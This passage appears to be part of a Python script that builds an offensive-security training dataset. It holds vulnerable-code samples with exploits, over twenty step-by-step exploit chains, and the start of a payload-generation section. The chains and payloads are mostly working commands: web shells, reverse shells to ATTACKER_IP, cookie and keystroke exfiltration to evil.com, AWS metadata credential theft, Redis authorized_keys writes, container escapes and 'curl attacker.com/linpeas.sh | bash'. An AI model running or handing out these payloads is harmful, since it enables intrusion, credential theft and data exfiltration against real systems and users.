  'from markupsafe import escape\n@app.route("/render")\ndef render_page():\n    name = request.args.get("name")\n    return f"Hello {escape(name)}!"\n# Or use render_template_string with name as variable, not in template source')

# --- CWE-384/776/269/276/1236/208 (7) ---
V("PHP",
  '<?php\nsession_start();\nif ($_POST["user"] === "admin" && $_POST["pass"] === check_pass("admin")) {\n    $_SESSION["user"] = "admin";\n    $_SESSION["role"] = "admin";\n}\n?>',
  384, "Session Fixation", "High (7/10)",
  ["Session ID is not regenerated after successful authentication",
   "If attacker sets victim's session ID (via URL or cookie injection), they share the session",
   "Attacker pre-sets session cookie, sends link to victim, victim authenticates",
   "Attacker's pre-set session ID is now authenticated — session hijack"],
  'Attacker sets `PHPSESSID=attackerKnownId` via XSS/link → victim logs in → attacker uses same session ID.',
  'session_start();\nif (authenticate($user, $pass)) {\n    session_regenerate_id(true);  // Regenerate session ID on auth\n    $_SESSION["user"] = "admin";\n}')

V("Java",
  'protected void doPost(HttpServletRequest req, HttpServletResponse resp) {\n    String user = req.getParameter("user");\n    if (authService.check(user, req.getParameter("pass"))) {\n        req.getSession().setAttribute("user", user);\n    }\n}',
  384, "Session Fixation in Java Servlet", "High (7/10)",
  ["Session not invalidated/regenerated after authentication",
   "Pre-existing session ID (from `JSESSIONID` cookie) persists through login",
   "Attacker fixates session, victim authenticates, attacker hijacks",
   "Violates OWASP session management guidelines"],
  'Attacker sets JSESSIONID via cookie injection → victim logs in → session is now authenticated.',
  'HttpSession old = req.getSession(false);\nif (old != null) old.invalidate();\nHttpSession session = req.getSession(true);\nsession.setAttribute("user", user);')

V("Java",
  'DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\nDocumentBuilder db = dbf.newDocumentBuilder();\nDocument doc = db.parse(xmlInput);\n// XML contains: <!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;...">...]>',
  776, "XML Entity Expansion (Billion Laughs)", "High (8/10)",
  ["XML parser processes DTD with recursively nested entity definitions",
   "Each expansion level multiplies memory usage exponentially",
   "10 levels of 10x expansion = 10^10 strings — gigabytes of memory",
   "Denial of Service — server runs out of memory and crashes"],
  '```xml\n<!DOCTYPE lolz [\n<!ENTITY lol "lol">\n<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">\n<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">\n]><root>&lol3;</root>\n```\nExpands to millions of "lol" strings, consuming all memory.',
  'dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);')

V("C",
  '#include <unistd.h>\nint main() {\n    setuid(0);\n    system("/bin/bash");\n    return 0;\n}',
  269, "Improper Privilege Management (SUID)", "Critical (10/10)",
  ["Program calls `setuid(0)` to become root, then spawns unrestricted shell",
   "If compiled and set with SUID bit (`chmod u+s`), any user gets root shell",
   "No authentication, authorization, or privilege dropping",
   "Complete system compromise via local privilege escalation"],
  '`chmod u+s program && ./program` → root shell for any user on the system.',
  '// Drop privileges after performing privileged operation\nsetuid(getuid());  // Drop back to real user\n// Never spawn shells with elevated privileges')

V("Python",
  'import os\nos.chmod("/etc/app/config.yml", 0o777)\nwith open("/etc/app/config.yml", "w") as f:\n    f.write(f"db_password: {db_pass}\\napi_key: {api_key}")',
  276, "World-Writable Sensitive Configuration", "High (8/10)",
  ["`chmod 777` makes config file readable and writable by all users",
   "Config contains database password and API key in plaintext",
   "Any user on the system can read secrets or modify configuration",
   "Attacker modifies config to point to their database or inject backdoors"],
  '`cat /etc/app/config.yml` as any user → reads db_password and api_key.',
  'os.chmod("/etc/app/config.yml", 0o600)  # Owner read/write only\nos.chown("/etc/app/config.yml", 0, 0)  # Root ownership')

V("Python",
  'import csv\nfrom flask import request, Response\n\n@app.route("/export")\ndef export():\n    rows = db.query("SELECT name, email FROM users")\n    output = "Name,Email\\n"\n    for r in rows:\n        output += f"{r.name},{r.email}\\n"\n    return Response(output, mimetype="text/csv")',
  1236, "CSV Injection (Formula Injection)", "Medium (6/10)",
  ["User-controlled data (`name`, `email`) written directly to CSV",
   "If name contains `=CMD(...)`, `+`, `-`, or `@`, Excel interprets as formula",
   "Attacker sets name to `=CMD(\"powershell -e <base64>\")`",
   "Opening CSV in Excel executes commands on the victim's machine"],
  'Register with name `=CMD("|powershell IEX(wget attacker.com/shell)|")` → victim downloads CSV, opens in Excel → RCE.',
  'def sanitize_csv(value):\n    if value and value[0] in ("=", "+", "-", "@", "\\t", "\\r"):\n        return "\'" + value  # Prefix with single quote\n    return value\noutput += f"{sanitize_csv(r.name)},{sanitize_csv(r.email)}\\n"')

V("Python",
  'import hmac\n\ndef verify_signature(received_sig, payload, secret):\n    expected = hmac.new(secret.encode(), payload.encode(), "sha256").hexdigest()\n    return received_sig == expected',
  208, "Observable Timing Discrepancy", "Medium (6/10)",
  ["String comparison `==` is not constant-time",
   "Short-circuits on first differing byte — timing reveals correct bytes",
   "Attacker measures response times to recover HMAC signature byte-by-byte",
   "Webhook signature verification becomes bypassable"],
  'Measure response time for `sig="0..."` vs `sig="a..."` — correct first byte takes marginally longer.',
  'return hmac.compare_digest(received_sig, expected)  # Constant-time comparison')


# ═══════════════════════════════════════════════════════════════
# SECTION 2: EXPLOIT CHAINS (25 samples)
# ═══════════════════════════════════════════════════════════════

E("SQLi → File Write → Web Shell → RCE",
  "You discovered a SQL injection vulnerability in a MySQL-backed web application's search parameter. Describe the full exploit chain to achieve Remote Code Execution.",
  ["Confirm SQLi with `' OR 1=1--` in search parameter — application returns all results",
   "Enumerate DB: `' UNION SELECT table_name,null FROM information_schema.tables--`",
   "Identify writable web directory via `@@datadir` and error messages",
   "Write web shell: `' UNION SELECT '<?php system($_GET[\"c\"]);?>',null INTO OUTFILE '/var/www/html/shell.php'--`",
   "Access web shell: `http://target.com/shell.php?c=id` — confirm RCE",
   "Upgrade: `shell.php?c=python3 -c 'import socket,subprocess,os;...'` for reverse shell",
   "Post-exploit: enumerate users, check sudo, pivot to other hosts"],
  "**sqlmap:** `sqlmap -u 'http://target/search?q=test' --os-shell`\n**Manual:** `curl 'http://target/search?q=%27+UNION+SELECT+%27%3C%3Fphp+system(\\$_GET[c]);%3F%3E%27+INTO+OUTFILE+%27/var/www/html/s.php%27--'`",
  "Full Remote Code Execution on web server. Attacker can read files, install backdoors, pivot to internal network, and exfiltrate data.")

E("SQLi → Data Dump → Credential Reuse → Lateral Movement",
  "You found a blind SQL injection in a login form. Describe the attack chain from initial exploitation to lateral movement across the network.",
  ["Confirm blind SQLi: `admin' AND 1=1--` (login success) vs `admin' AND 1=2--` (login failure)",
   "Extract DB version character-by-character: `admin' AND SUBSTRING(@@version,1,1)='5'--`",
   "Automate extraction: `sqlmap -u http://target/login --data='user=admin&pass=x' --dump`",
   "Dump `users` table — obtain email/password hashes",
   "Crack hashes with hashcat: `hashcat -m 0 hashes.txt rockyou.txt` (MD5) or `-m 3200` (bcrypt)",
   "Test cracked credentials against SSH, VPN, email, and admin panels (credential stuffing)",
   "Establish foothold on internal server via reused credentials",
   "Enumerate internal network: `nmap -sn 10.0.0.0/24` from compromised host"],
  "**sqlmap:** `sqlmap --dump --threads=10`\n**hashcat:** `hashcat -m 0 -a 0 hashes.txt rockyou.txt --force`\n**hydra:** `hydra -L users.txt -P cracked.txt ssh://10.0.0.1`",
  "Database dumped, passwords cracked, lateral movement to internal systems via credential reuse.")

E("Reflected XSS → Cookie Theft → Session Hijack → Admin Panel",
  "You found a reflected XSS vulnerability in a web application's search page. Describe how to escalate this to admin account takeover.",
  ["Confirm XSS: `?q=<script>alert(1)</script>` — script executes in response",
   "Test cookie accessibility: `<script>alert(document.cookie)</script>` — session cookie is not HttpOnly",
   "Craft exfiltration payload: `<script>new Image().src='http://attacker.com/steal?c='+document.cookie</script>`",
   "URL-encode payload and send to admin via phishing email or support ticket",
   "Monitor attacker server logs for incoming cookie values",
   "Set stolen session cookie in browser: `document.cookie='session=<stolen_value>'`",
   "Navigate to admin panel with hijacked session — full admin access",
   "Create new admin account for persistence"],
  "**Payload:** `<script>fetch('https://evil.com/c?'+document.cookie)</script>`\n**Cookie set:** Browser DevTools → Application → Cookies → paste stolen value\n**Burp:** Repeater with `Cookie: session=<stolen>` header",
  "Admin account takeover. Attacker has full application control, can modify users, data, and settings.")

E("SSRF → AWS IMDSv1 → IAM Credentials → S3 Exfiltration",
  "You found an SSRF vulnerability in a web application running on AWS EC2. Describe the full exploit chain to exfiltrate S3 data.",
  ["Confirm SSRF: `?url=http://169.254.169.254/` — returns metadata API response",
   "Enumerate instance: `?url=http://169.254.169.254/latest/meta-data/instance-id`",
   "Get IAM role name: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/`",
   "Steal temporary credentials: `?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`",
   "Response contains `AccessKeyId`, `SecretAccessKey`, and `Token`",
   "Configure AWS CLI: `export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...`",
   "List S3 buckets: `aws s3 ls` — enumerate all accessible buckets",
   "Exfiltrate: `aws s3 sync s3://sensitive-data-bucket ./exfil/`"],
  "**curl:** `curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'`\n**aws cli:** `aws s3 ls --region us-east-1`\n**Pacu:** AWS exploitation framework for automated enumeration",
  "Full AWS account compromise via stolen IAM credentials. S3 data exfiltrated, potential access to other AWS services.")

E("SSRF → Internal Redis → Config Manipulation → RCE",
  "You discovered an SSRF vulnerability that can reach internal services. Redis is running on the default port on an internal host. Describe the RCE exploit chain.",
  ["Confirm internal access: `?url=http://10.0.0.5:6379/` — Redis error response confirms accessibility",
   "Craft Redis protocol payload via gopher SSRF: `gopher://10.0.0.5:6379/_*1%0d%0a\\$8%0d%0aflushall%0d%0a...`",
   "Set Redis key with SSH public key content: `SET sshkey '\\n\\nssh-rsa AAAA...attacker_key\\n\\n'`",
   "Configure Redis to write to authorized_keys: `CONFIG SET dir /root/.ssh` then `CONFIG SET dbfilename authorized_keys`",
   "Save: `SAVE` — Redis writes key content to /root/.ssh/authorized_keys",
   "SSH into target: `ssh -i attacker_key root@10.0.0.5` — root access"],
  "**Gopher payload:** SSRF via `gopher://` protocol to inject Redis commands\n**Gopherus:** `python gopherus.py --exploit redis` generates payload\n**SSH:** `ssh -i id_rsa root@10.0.0.5`",
  "Root-level RCE on internal Redis server via SSRF → Redis write to authorized_keys.")

E("File Upload → PHP Web Shell → Reverse Shell → Privilege Escalation",
  "You found an unrestricted file upload vulnerability on a PHP application. Describe the full attack chain to gain root access.",
  ["Upload PHP web shell: `<?php system($_GET['c']); ?>` as `shell.php`",
   "If extension blocked, try bypass: `shell.php.jpg`, `shell.pHp`, `shell.php%00.jpg`",
   "Access web shell: `http://target/uploads/shell.php?c=id` — confirm execution as `www-data`",
   "Upgrade to reverse shell: `?c=python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"ATTACKER\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'`",
   "Catch shell: `nc -lvnp 4444` on attacker machine",
   "Stabilize: `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'` then `export TERM=xterm`",
   "Enumerate privesc: `sudo -l`, `find / -perm -u=s -type f 2>/dev/null`, `cat /etc/crontab`",
   "Exploit SUID binary or sudo misconfiguration for root shell"],
  "**Web shell:** `<?php system($_GET['c']); ?>`\n**Listener:** `nc -lvnp 4444`\n**LinPEAS:** `curl attacker.com/linpeas.sh | bash` for automated enumeration",
  "Root access on web server. From initial file upload to full system compromise via web shell → reverse shell → privilege escalation.")

E("XXE → File Read → Credential Discovery → Database Access",
  "You found an XML External Entity (XXE) vulnerability in an API endpoint. Describe how to escalate to database access.",
  ["Confirm XXE: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>`",
   "Read `/etc/passwd` to enumerate system users",
   "Read application config: `file:///var/www/app/config/database.yml` or `.env`",
   "Extract database credentials from config file",
   "If binary files needed, use PHP filter: `php://filter/convert.base64-encode/resource=config.php`",
   "Connect to database with stolen credentials: `mysql -h db-host -u admin -p`",
   "Dump sensitive tables: `SELECT * FROM users; SELECT * FROM payments;`"],
  "**XXE Payload:** `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///var/www/app/.env'>]><root>&xxe;</root>`\n**PHP filter:** `php://filter/convert.base64-encode/resource=/var/www/app/config.php`\n**mysql:** `mysql -h 10.0.0.3 -u app_user -p'stolen_pass' app_db`",
  "Database credentials stolen via file read. Full database access including user data, payment info, and application secrets.")

E("Java Deserialization → RCE → Reverse Shell → Domain Enumeration",
  "You identified a Java deserialization vulnerability in a web application that uses Apache Commons Collections. Describe the exploit chain.",
  ["Identify deserialization endpoint (Java serialized object in request body, `Content-Type: application/x-java-serialized-object`)",
   "Generate payload: `java -jar ysoserial.jar CommonsCollections1 'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|{bash,-i}'`",
   "Send serialized payload to vulnerable endpoint via curl/Burp",
   "Catch reverse shell: `nc -lvnp 4444`",
   "Identify OS and Java version: `uname -a`, `java -version`",
   "Enumerate domain: `hostname -d`, `cat /etc/resolv.conf`, `nslookup _ldap._tcp.domain.local`",
   "Check for Kerberos: `klist`, `find / -name krb5.conf 2>/dev/null`",
   "Pivot: use Java app's DB credentials for lateral movement"],
  "**ysoserial:** `java -jar ysoserial.jar CommonsCollections1 'command'`\n**Burp:** Send serialized bytes in request body\n**nc:** `nc -lvnp 4444`",
  "Remote Code Execution via deserialization. Reverse shell established, domain enumeration reveals Active Directory targets for lateral movement.")

E("Python Pickle → RCE → Container Escape → Host Access",
  "You found a Python application that deserializes user-supplied pickle data. The app runs in a Docker container. Describe the full exploit chain to escape to the host.",
  ["Craft pickle RCE payload: `class Exploit: __reduce__ = lambda self: (os.system, ('COMMAND',))`",
   "Send serialized payload to the vulnerable endpoint",
   "Initial shell is inside Docker container as application user",
   "Check container escape vectors: `cat /proc/1/cgroup`, `ls -la /var/run/docker.sock`",
   "If Docker socket is mounted: `docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host`",
   "If privileged container: `mkdir /tmp/escape && mount -t cgroup -o rdma cgroup /tmp/escape && ...`",
   "If neither, check for CVE-2019-5736 (runc vulnerability) or kernel exploits",
   "On host: escalate privileges and establish persistence"],
  "**Pickle payload:** `pickle.dumps(Exploit())`\n**Docker escape:** `docker run -v /:/host --privileged alpine chroot /host`\n**nsenter:** `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash`",
  "Full host compromise from container escape. Starting from a pickle deserialization bug, escalating through Docker misconfiguration to host root access.")

E("SSTI (Jinja2) → RCE → Reverse Shell → Network Pivot",
  "You found a Server-Side Template Injection in a Flask application using Jinja2. Describe the full exploit chain to pivot into the internal network.",
  ["Confirm SSTI: `{{7*7}}` returns `49` in response",
   "Enumerate: `{{config.items()}}` dumps Flask config (SECRET_KEY, DB URI)",
   "Find RCE chain: `{{''.__class__.__mro__[1].__subclasses__()}}` lists all Python classes",
   "Identify subprocess.Popen (typically index ~200+): `{{''.__class__.__mro__[1].__subclasses__()[X]('id',shell=True,stdout=-1).communicate()}}`",
   "Execute reverse shell payload via Popen",
   "Catch shell on attacker machine: `nc -lvnp 4444`",
   "Discover internal network: `ip addr`, `cat /etc/hosts`, `arp -a`",
   "Set up SOCKS proxy: `ssh -D 1080 -f -N user@compromised` then use proxychains for internal scanning"],
  "**SSTI RCE:** `{{''.__class__.__mro__[1].__subclasses__()[X]('command',shell=True,stdout=-1).communicate()}}`\n**Proxychains:** `proxychains nmap -sT 10.0.0.0/24`\n**Chisel:** `./chisel server -p 8000 --reverse` + `./chisel client ATTACKER:8000 R:socks`",
  "From SSTI to internal network access. Reverse shell → network enumeration → SOCKS proxy for pivoting to attack internal services.")

E("JWT None Algorithm → Auth Bypass → Admin API → Data Manipulation",
  "You discovered that a web application's JWT implementation accepts the 'none' algorithm. Describe the exploitation.",
  ["Capture valid JWT from login response or cookie",
   "Decode JWT: `echo '<token>' | cut -d. -f2 | base64 -d` — inspect payload claims",
   "Modify header to `{\"alg\":\"none\",\"typ\":\"JWT\"}`",
   "Modify payload: change `role` to `admin`, `user_id` to admin's ID",
   "Re-encode: `base64url(header).base64url(payload).` (empty signature, trailing dot)",
   "Send forged token in `Authorization: Bearer <forged>` header",
   "Access admin API endpoints: `GET /api/admin/users`, `POST /api/admin/config`",
   "Modify application settings, create backdoor admin accounts"],
  "**jwt_tool:** `python3 jwt_tool.py <token> -X a` (alg none attack)\n**Manual:** `echo -n '{\"alg\":\"none\"}' | base64 -w0 | tr '+/' '-_' | tr -d '='`\n**Burp:** JWT Editor extension",
  "Complete authentication bypass. Attacker gains admin privileges, can create accounts, modify data, change configurations.")

E("Prototype Pollution → RCE via child_process",
  "You found a prototype pollution vulnerability in a Node.js Express application. Describe the chain to achieve Remote Code Execution.",
  ["Identify prototype pollution via merge/extend function: `{\"__proto__\":{\"polluted\":true}}`",
   "Confirm: access any object property `.polluted` returns `true`",
   "Target: `child_process.spawn/exec` uses `env` from prototype if not explicitly set",
   "Pollute: `{\"__proto__\":{\"shell\":\"/proc/self/exe\",\"NODE_OPTIONS\":\"--require /proc/self/cmdline\"}}`",
   "Alternative: pollute `{\"__proto__\":{\"shell\":true,\"NODE_OPTIONS\":\"--require=./malicious.js\"}}`",
   "Trigger any code path that spawns child process",
   "Malicious code executes in spawned process context — RCE achieved"],
  "**Payload:** `{\"constructor\":{\"prototype\":{\"shell\":\"node\",\"NODE_OPTIONS\":\"--require /tmp/rce.js\"}}}`\n**PoC:** Write `/tmp/rce.js` via path traversal or file upload, then trigger spawn",
  "Remote Code Execution via prototype pollution. Attacker controls child process environment, achieving arbitrary code execution on the server.")

E("IDOR → PII Exfiltration → Social Engineering → Account Takeover",
  "You found an IDOR vulnerability in a user profile API. Describe how to escalate from data access to full account takeover.",
  ["Discover IDOR: `GET /api/users/1` returns your profile, `GET /api/users/2` returns another user's data",
   "Script enumeration: `for i in range(1, 10000): requests.get(f'/api/users/{i}')` — dump all profiles",
   "Exfiltrate PII: names, emails, phone numbers, addresses, security questions",
   "Use leaked security questions to bypass account recovery",
   "Alternative: Call support with victim's PII for social engineering",
   "Request password reset for victim's email",
   "Answer security questions (from leaked data) to set new password",
   "Log in as victim — full account takeover"],
  "**Burp Intruder:** Iterate `GET /api/users/§1§` from 1-10000\n**Script:** `for i in range(10000): r=requests.get(f'http://target/api/users/{i}', headers={'Auth':'token'})`",
  "Mass PII exfiltration + account takeover. Starting from a simple IDOR, escalating through social engineering to compromise individual accounts.")

E("CSRF → Password Change → Account Takeover",
  "You found that the password change endpoint has no CSRF protection. Describe the attack chain.",
  ["Verify no CSRF token in password change form",
   "Check: no `Referer`/`Origin` header validation, no SameSite cookie attribute",
   "Craft malicious HTML page with auto-submitting form targeting `/change-password`",
   "Host payload: `<form action='http://target/change-password' method='POST'><input name='new_password' value='hacked123'></form><script>document.forms[0].submit()</script>`",
   "Send link to victim (via email, message, or embed in another site)",
   "Victim visits page → browser auto-submits form with victim's session cookies",
   "Password changed to `hacked123` without victim's knowledge",
   "Attacker logs in with new password — full account takeover"],
  "**HTML payload:** Auto-submitting form hosted on attacker's site\n**iframe:** `<iframe style='display:none' src='http://evil.com/csrf.html'></iframe>` for stealth",
  "Account takeover via CSRF. Victim's password changed silently, attacker gains full access.")

E("Open Redirect → OAuth Code Interception → Token Theft",
  "You found an open redirect on the OAuth callback URL of a web application. Describe how to steal OAuth tokens.",
  ["Identify open redirect: `http://app.com/callback?redirect=http://evil.com` — redirects to evil.com",
   "Craft OAuth authorization URL with modified `redirect_uri` parameter",
   "OAuth provider validates `redirect_uri` prefix: `http://app.com/callback` ✓ (matches registered URI)",
   "But the callback page itself redirects to attacker-controlled URL with auth code in URL/Referer",
   "Full URL: `https://oauth.provider.com/authorize?client_id=APP&redirect_uri=http://app.com/callback?redirect=http://evil.com&response_type=code`",
   "Victim clicks link → authenticates with OAuth provider → redirected to `app.com/callback` → redirected to `evil.com` with code in URL/Referer",
   "Attacker captures authorization code from URL parameters or Referer header",
   "Exchange code for access token using known `client_id`"],
  "**URL crafting:** Embed open redirect in OAuth callback\n**Server:** Simple HTTP server to capture Referer/params\n**Token exchange:** `curl -X POST oauth-provider.com/token -d 'code=STOLEN&client_id=APP&...'`",
  "OAuth access token stolen via open redirect. Attacker accesses victim's account on the OAuth-protected application.")

E("Path Traversal → .env File → API Keys → Cloud Account Takeover",
  "You discovered a path traversal vulnerability in a file download endpoint. Describe the exploit chain to cloud account compromise.",
  ["Confirm path traversal: `GET /download?file=../../../etc/passwd` — returns system users",
   "Enumerate web root: try `../app/.env`, `../../.env`, `../config/settings.py`",
   "Download `.env` file: contains `AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `DATABASE_URL`",
   "Also check: `../config/credentials.yml`, `../.git/config`, `../docker-compose.yml`",
   "Configure AWS CLI with stolen credentials",
   "Enumerate access: `aws sts get-caller-identity`, `aws iam list-attached-user-policies`",
   "Escalate: create new IAM admin user or access key for persistence",
   "Exfiltrate data from S3, RDS, Secrets Manager"],
  "**Path traversal:** `GET /download?file=....//....//....//var/www/app/.env`\n**AWS:** `aws configure` with stolen keys\n**Persistence:** `aws iam create-access-key --user-name compromised-user`",
  "Cloud account takeover via leaked credentials. Full access to AWS resources, data exfiltration, and persistent backdoor access key created.")

E("Cache Poisoning → Stored XSS → Mass Credential Theft",
  "You discovered that a web application's CDN caches responses based on the URL path but doesn't include certain headers in the cache key. Describe the web cache poisoning attack.",
  ["Identify unkeyed headers: `X-Forwarded-Host`, `X-Original-URL`, or custom headers",
   "Test reflection: set `X-Forwarded-Host: evil.com` — response includes `<script src='http://evil.com/js'>`",
   "Confirm caching: request same URL normally — poisoned response is served from cache",
   "Host malicious JavaScript on `evil.com/js`: keylogger, credential stealer, session hijacker",
   "Wait for cache to serve poisoned response to all users visiting the URL",
   "Keylogger captures credentials, session tokens, and form data",
   "Scale: poison high-traffic pages (login, dashboard, checkout) for maximum impact"],
  "**Param Miner (Burp):** Detect unkeyed headers automatically\n**Malicious JS:** `document.addEventListener('submit', e => fetch('http://evil.com/log', {method:'POST', body:new FormData(e.target)}))`",
  "Mass credential theft via cached XSS. Every user visiting the poisoned page loads attacker's JavaScript, sending their credentials and session data to the attacker.")

E("Race Condition → Double Spend",
  "You found that a web application's payment/transfer endpoint doesn't use proper locking. Describe the race condition exploit.",
  ["Identify race window: transfer endpoint checks balance, then deducts — not atomic",
   "Set up: account has $100 balance",
   "Send 10 concurrent transfer requests of $100 each simultaneously",
   "Use threading/async to ensure requests hit the server at the same time",
   "Each request reads balance=$100 (sufficient), proceeds with transfer",
   "All 10 transfers succeed before any balance update is committed",
   "Result: $1000 transferred from $100 balance — double/multi spend achieved"],
  "**Turbo Intruder (Burp):** Send requests in parallel with single-packet attack\n**Python:** `import asyncio; tasks = [transfer(100) for _ in range(10)]; await asyncio.gather(*tasks)`\n**curl:** `for i in $(seq 1 10); do curl -X POST .../transfer -d 'amount=100' & done; wait`",
  "Financial fraud via race condition. Attacker transfers more money than available by exploiting non-atomic balance check and deduction.")

E("Stored XSS → Keylogger → Credential Harvesting",
  "You found a stored XSS vulnerability in a web application's comment system. Describe how to deploy a keylogger for mass credential harvesting.",
  ["Confirm stored XSS: submit comment `<script>alert(1)</script>` — persists and executes for all viewers",
   "Develop keylogger payload: capture all keystrokes and form submissions on the page",
   "Payload: `<script>document.addEventListener('keypress',e=>fetch('http://evil.com/k?k='+e.key+'&u='+location.href))</script>`",
   "Enhanced: capture form data on submit — usernames, passwords, credit cards",
   "Inject into high-traffic page (forum main page, popular thread, dashboard)",
   "Attacker's server logs all captured keystrokes with page context",
   "Parse logs to extract credentials — filter for login pages and sensitive forms",
   "Use harvested credentials for account takeover across the application"],
  "**Keylogger payload:** Event listeners for keypress, form submit, input change\n**BeEF:** Browser Exploitation Framework for advanced XSS exploitation\n**Server:** Node.js/Flask endpoint to receive and log captured data",
  "Mass credential harvesting via persistent keylogger. All users interacting with the infected page have their keystrokes and form data captured.")

E("XXE → SSRF → Internal Admin Panel → Configuration Dump",
  "You found an XXE vulnerability in an API that accepts XML. The application has an internal admin panel. Describe the exploit chain.",
  ["Confirm XXE: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/hostname'>]><root>&xxe;</root>`",
   "Enumerate internal network via SSRF: `<!ENTITY xxe SYSTEM 'http://10.0.0.1:80/'>`",
   "Port scan internal hosts: try ports 80, 443, 8080, 8443, 3000, 5000, 9200 on 10.0.0.0/24",
   "Discover admin panel on `http://10.0.0.5:8080/admin` — returns HTML content",
   "Read admin panel pages via XXE SSRF: `<!ENTITY xxe SYSTEM 'http://10.0.0.5:8080/admin/config'>`",
   "Extract database credentials, API keys, and infrastructure details from config page",
   "Use OOB XXE if response is not reflected: `<!ENTITY % file SYSTEM 'file:///etc/shadow'><!ENTITY % eval '<!ENTITY &#x25; exfil SYSTEM \"http://evil.com/?d=%file;\">'>%eval;%exfil;`"],
  "**XXE SSRF:** `<!ENTITY xxe SYSTEM 'http://internal:8080/admin/config'>`\n**OOB exfil:** External DTD on attacker server for blind data extraction\n**Burp Collaborator:** Detect OOB interactions",
  "Internal admin panel accessed and configuration dumped via XXE→SSRF chain. Credentials for databases and internal services extracted.")

E("File Upload → Polyglot → Stored XSS → Session Hijack",
  "You found a file upload that validates MIME type but not content. Describe the polyglot attack chain.",
  ["Upload endpoint checks Content-Type header and file extension — accepts images only",
   "Create polyglot file: valid JPEG header + HTML/JS payload",
   "Polyglot: `GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;` (valid GIF89a + JS)",
   "Upload polyglot as `avatar.gif` — passes validation (valid GIF magic bytes)",
   "If server serves uploads with `Content-Type` based on file content and browser sniffs as HTML",
   "Navigate to uploaded file directly: `http://target/uploads/avatar.gif` — browser renders HTML/JS",
   "XSS executes in application's origin — steal session cookies",
   "Hijack admin sessions for full application control"],
  "**Polyglot generator:** `exiftool -Comment='<script>alert(1)</script>' image.jpg`\n**Magic bytes:** `GIF89a` prefix makes file valid GIF\n**Content-Type confusion:** Server serves as `image/gif` but browser sniffs and renders HTML",
  "Session hijacking via polyglot file upload. Stored XSS triggered when uploaded 'image' is viewed, stealing viewer's session.")

E("DOM XSS → OAuth Token Theft → API Abuse",
  "You found a DOM-based XSS via the URL fragment. The application uses OAuth with implicit grant flow. Describe the token theft chain.",
  ["Application stores OAuth access token in URL fragment: `http://app.com/#access_token=xxx`",
   "DOM XSS: JavaScript reads `location.hash` and injects into `innerHTML` without sanitization",
   "Craft URL: `http://app.com/#access_token=xxx<img src=x onerror='...'>`",
   "XSS payload reads `location.hash` to extract the access token",
   "Exfiltrate token: `fetch('http://evil.com/steal?token='+token)`",
   "Use stolen token to call API: `Authorization: Bearer <stolen_token>`",
   "Enumerate API endpoints and exfiltrate user data",
   "Create persistence: authorize attacker's app or modify OAuth scopes"],
  "**Payload:** `<img src=x onerror=\"fetch('http://evil.com/?t='+location.hash.split('=')[1])\">`\n**API abuse:** `curl -H 'Authorization: Bearer STOLEN' https://api.target.com/v1/me`",
  "OAuth access token stolen via DOM XSS. Attacker accesses victim's API data and performs actions on their behalf.")

E("HTTP Request Smuggling (CL.TE) → Request Hijacking",
  "You discovered that a web application behind a reverse proxy has a CL.TE request smuggling vulnerability. Describe the exploit.",
  ["Identify: front-end (proxy) uses Content-Length, back-end uses Transfer-Encoding",
   "Craft smuggled request: front-end reads CL bytes, back-end interprets TE chunked encoding",
   "Smuggled prefix prepended to next user's request on the back-end",
   "Test: `POST / HTTP/1.1\\r\\nContent-Length: 13\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nSMUGGLED`",
   "The `SMUGGLED` portion becomes the start of the next request processed by back-end",
   "Hijack: smuggle `GET /admin HTTP/1.1\\r\\nHost: target\\r\\n` — next user's request becomes admin page access",
   "Steal credentials: smuggle request that captures next user's cookies",
   "Escalate: poison web cache or steal authenticated sessions"],
  "**Burp:** HTTP Request Smuggler extension for detection\n**Manual:** Carefully craft CL/TE mismatch requests\n**Impact types:** Request hijacking, cache poisoning, credential theft",
  "Request hijacking via HTTP smuggling. Attacker's smuggled request prefix captures or modifies other users' requests, enabling session theft and cache poisoning.")

# ═══════════════════════════════════════════════════════════════
# SECTION 3: PAYLOAD GENERATION (30 samples)
# ═══════════════════════════════════════════════════════════════

P("Generate a Bash reverse shell one-liner.",
  "Reverse Shell — Bash",
  'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
  "1. `bash -i` starts an interactive bash shell\n2. `>& /dev/tcp/ATTACKER_IP/4444` redirects stdout and stderr to a TCP connection to attacker's IP on port 4444\n3. `0>&1` redirects stdin from the same TCP connection\n4. The attacker runs `nc -lvnp 4444` to catch the incoming shell\n5. All input/output is tunneled through the TCP socket",
  "Use when target has bash available and outbound TCP is not filtered. Requires `/dev/tcp` support (not available in all bash builds). Alternative: `bash -c 'sh -i >& /dev/tcp/IP/PORT 0>&1'`")

P("Generate a Python reverse shell payload.",
  "Reverse Shell — Python",
  'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])\'',
